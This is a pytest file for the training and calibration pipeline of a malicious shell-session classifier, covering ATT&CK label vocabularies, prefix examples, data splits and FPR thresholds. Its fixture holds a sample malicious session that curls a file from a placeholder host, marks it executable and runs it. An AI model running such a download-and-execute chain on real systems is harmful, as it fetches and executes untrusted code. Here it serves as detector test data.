from __future__ import annotations

import json
from pathlib import Path

import numpy as np
import pytest

from cmdrisk.training.calibration import (
    Calibration,
    find_threshold_at_fpr,
    fit_calibration,
    fit_temperature,
    sigmoid,
)
from cmdrisk.training.config import choose_batch_config, choose_micro_batch
from cmdrisk.training.data import build_prefix_examples, select_prefix_indices
from cmdrisk.training.labels import LabelVocabulary, compute_pos_weight
from cmdrisk.training.pipeline import _calibrate_and_evaluate, _stable_family_partition


def _record(
    *,
    session_id: str = "s1",
    family_id: str = "f1",
    split: str = "train",
    malicious: int = 1,
) -> dict:
    return {
        "session_id": session_id,
        "family_id": family_id,
        "split": split,
        "source": {"kind": "real_malicious" if malicious else "script_benign"},
        "commands": [
            {"cmd": "whoami", "dt": 0},
            {"cmd": "curl http://example.invalid/a", "dt": 1},
            {"cmd": "chmod +x /tmp/a", "dt": 2},
            {"cmd": "/tmp/a", "dt": 1},
        ],
        "label": {
            "malicious": malicious,
            "first_evidence_index": 2 if malicious else None,
            "techniques": ["T1105", "T1222", "T1059"] if malicious else [],
            "technique_evidence": {
                "T1105": [1],
                "T1222": [2],
                "T1059": [3],
            }
            if malicious
            else {},
            "tactics": ["TA0011", "TA0005", "TA0002"] if malicious else [],
        },
    }


def test_vocabulary_is_data_derived_and_frequency_filtered() -> None:
    records = [_record(session_id=f"s{i}", family_id=f"f{i}") for i in range(3)]
    vocabulary = LabelVocabulary.build(
        records,
        min_technique_sessions=3,
        min_technique_families=3,
    )
    assert vocabulary.techniques == ("T1059", "T1105", "T1222")
    assert len(vocabulary.tactics) == 14

    filtered = LabelVocabulary.build(
        records,
        min_technique_sessions=4,
        min_technique_families=3,
    )
    assert filtered.techniques == ()


def test_vocabulary_save_load_and_prefix_encoding(tmp_path: Path) -> None:
    vocabulary = LabelVocabulary.canonical(["T1105", "T1222", "T1059"])
    path = vocabulary.save(tmp_path / "labels.json")
    loaded = LabelVocabulary.load(path)
    assert loaded == vocabulary

    record = _record()
    before = loaded.encode(record["label"], 1)
    evidence = loaded.encode(record["label"], 2)
    execution = loaded.encode(record["label"], 3)
    assert before.malicious == 0
    assert before.tactics == (0.0,) * 14
    assert sum(evidence.tactics) > 0
    assert evidence.techniques[loaded.technique_index["T1105"]] == 1.0
    assert evidence.techniques[loaded.technique_index["T1059"]] == 0.0
    assert execution.malicious == 1
    assert execution.techniques[loaded.technique_index["T1059"]] == 1.0


def test_position_weight_is_capped() -> None:
    rows = [[0, 1], [0, 1], [0, 1], [0, 1], [1, 1]]
    assert compute_pos_weight(rows, cap=10.0) == [4.0, 1.0]
    assert compute_pos_weight([[0, 0], [0, 0]], cap=10.0) == [1.0, 1.0]


def test_prefix_selection_retains_evidence_and_ends() -> None:
    indices = set(
        select_prefix_indices(
            100,
            max_prefixes=12,
            first_evidence_index=50,
            evidence_indices=[20, 75],
        )
    )
    assert 0 in indices
    assert 99 in indices
    assert {48, 49, 50, 51}.issubset(indices)
    assert {20, 75}.issubset(indices)
    assert len(indices) == 12


def test_prefix_examples_are_benign_before_first_evidence() -> None:
    vocabulary = LabelVocabulary.canonical(["T1105", "T1222", "T1059"])
    examples = build_prefix_examples(_record(), vocabulary, max_prefixes=32)
    assert [example.prefix_length for example in examples] == [1, 2, 3, 4]
    assert [example.malicious for example in examples] == [0.0, 0.0, 1.0, 1.0]
    assert examples[1].techniques[vocabulary.technique_index["T1105"]] == 0.0
    assert examples[2].techniques[vocabulary.technique_index["T1222"]] == 1.0
    assert examples[2].techniques[vocabulary.technique_index["T1059"]] == 0.0


def test_empty_technique_evidence_falls_back_to_session_onset() -> None:
    vocabulary = LabelVocabulary.canonical(["T1105"])
    record = _record()
    record["label"]["technique_evidence"] = {"T1105": []}

    example = vocabulary.encode(record["label"], 2)

    assert example.techniques[vocabulary.technique_index["T1105"]] == 1.0


def test_family_partition_keeps_family_ids_disjoint() -> None:
    vocabulary = LabelVocabulary.canonical(["T1105"])
    first = build_prefix_examples(_record(session_id="s1", family_id="f1"), vocabulary)
    second = build_prefix_examples(_record(session_id="s2", family_id="f1"), vocabulary)
    third = build_prefix_examples(_record(session_id="s3", family_id="f2"), vocabulary)

    selection, calibration = _stable_family_partition(
        [*first, *second, *third], fraction=0.5, seed=7
    )

    assert {item.family_id for item in selection}.isdisjoint(
        {item.family_id for item in calibration}
    )
    assert selection and calibration


def test_calibration_fits_on_dev_and_evaluates_separate_test_data(tmp_path: Path) -> None:
    vocabulary = LabelVocabulary.canonical(["T1105"])
    calibration_examples = build_prefix_examples(
        _record(session_id="cal", family_id="cal-family"), vocabulary
    )
    test_examples = build_prefix_examples(
        _record(session_id="test", family_id="test-family"), vocabulary
    )
    collected: list[tuple[str, ...]] = []
    evaluated: list[object] = []

    def fake_collect(**kwargs: object) -> dict[str, np.ndarray]:
        examples = kwargs["examples"]
        assert isinstance(examples, list)
        collected.append(tuple(item.session_id for item in examples))
        return {
            "malicious_logits": np.asarray([0.0]),
            "malicious_labels": np.asarray([1.0]),
            "tactic_logits": np.zeros((1, len(vocabulary.tactics))),
            "tactic_labels": np.zeros((1, len(vocabulary.tactics))),
            "technique_logits": np.zeros((1, len(vocabulary.techniques))),
            "technique_labels": np.zeros((1, len(vocabulary.techniques))),
        }

    calibration = Calibration(
        malicious_temperature=1.0,
        malicious_threshold=0.5,
        tactic_temperature=1.0,
        technique_temperature=1.0,
        tactic_thresholds={item: 0.5 for item in vocabulary.tactics},
        technique_thresholds={item: 0.5 for item in vocabulary.techniques},
    )

    def fake_fit(**kwargs: object) -> Calibration:
        assert kwargs["malicious_labels"].tolist() == [1.0]
        return calibration

    def fake_evaluate(
        predictions: dict[str, np.ndarray],
        fitted: Calibration,
        **kwargs: object,
    ) -> dict[str, object]:
        del kwargs
        assert predictions["malicious_logits"].tolist() == [0.0]
        assert fitted is calibration
        evaluated.append(predictions)
        return {"ok": True}

    result, metrics = _calibrate_and_evaluate(
        model=object(),  # type: ignore[arg-type]
        tokenizer=object(),  # type: ignore[arg-type]
        calibration_examples=calibration_examples,
        test_examples=test_examples,
        batch_size=2,
        device="cpu",  # type: ignore[arg-type]
        vocabulary=vocabulary,
        max_fpr=0.01,
        collect_logits=fake_collect,
        fit=fake_fit,
        evaluate=fake_evaluate,
    )

    assert result is calibration
    assert metrics == {"ok": True}
    assert collected == [("cal",) * len(calibration_examples), ("test",) * len(test_examples)]
    assert evaluated


def test_temperature_scaling_and_fpr_threshold() -> None:
    rng = np.random.default_rng(42)
    negative_logits = rng.normal(-2.5, 1.0, size=2000)
    positive_logits = rng.normal(2.5, 1.0, size=500)
    logits = np.concatenate([negative_logits, positive_logits])
    labels = np.concatenate([np.zeros(2000), np.ones(500)])
    temperature = fit_temperature(logits, labels)
    assert 0.05 <= temperature <= 20.0
    probabilities = sigmoid(logits / temperature)
    threshold = find_threshold_at_fpr(labels, probabilities, max_fpr=0.01)
    predictions = probabilities >= threshold
    fpr = np.count_nonzero(predictions & (labels == 0)) / np.count_nonzero(labels == 0)
    assert fpr <= 0.01


def test_calibration_round_trip_and_multilabel_thresholds(tmp_path: Path) -> None:
    rng = np.random.default_rng(7)
    n = 400
    malicious_logits = rng.normal(size=n)
    malicious_labels = (malicious_logits + rng.normal(0, 0.5, n) > 0).astype(float)
    tactic_logits = rng.normal(size=(n, 2))
    tactic_labels = (tactic_logits > 0).astype(float)
    technique_logits = rng.normal(size=(n, 1))
    technique_labels = (technique_logits > 0).astype(float)
    calibration = fit_calibration(
        malicious_logits=malicious_logits,
        malicious_labels=malicious_labels,
        tactic_logits=tactic_logits,
        tactic_labels=tactic_labels,
        tactic_ids=["TA0001", "TA0002"],
        technique_logits=technique_logits,
        technique_labels=technique_labels,
        technique_ids=["T1105"],
        max_fpr=0.01,
    )
    path = calibration.save(tmp_path / "calibration.json")
    loaded = Calibration.load(path)
    assert loaded == calibration
    assert set(json.loads(path.read_text(encoding="utf-8"))["tactic_thresholds"]) == {
        "TA0001",
        "TA0002",
    }


@pytest.mark.parametrize(
    ("vram", "phase", "expected"),
    [
        (48, "short", 32),
        (32, "short", 16),
        (16, "short", 8),
        (48, "long", 4),
        (32, "long", 2),
        (16, "long", 1),
    ],
)
def test_micro_batch_planning(vram: float, phase: str, expected: int) -> None:
    assert choose_micro_batch(vram_gb=vram, phase=phase) == expected


def test_effective_batch_is_recovered_with_accumulation() -> None:
    short = choose_batch_config(vram_gb=32, phase="short", world_size=1)
    assert short.effective_batch_size == 64
    long = choose_batch_config(vram_gb=32, phase="long", world_size=2)
    assert long.effective_batch_size == 16
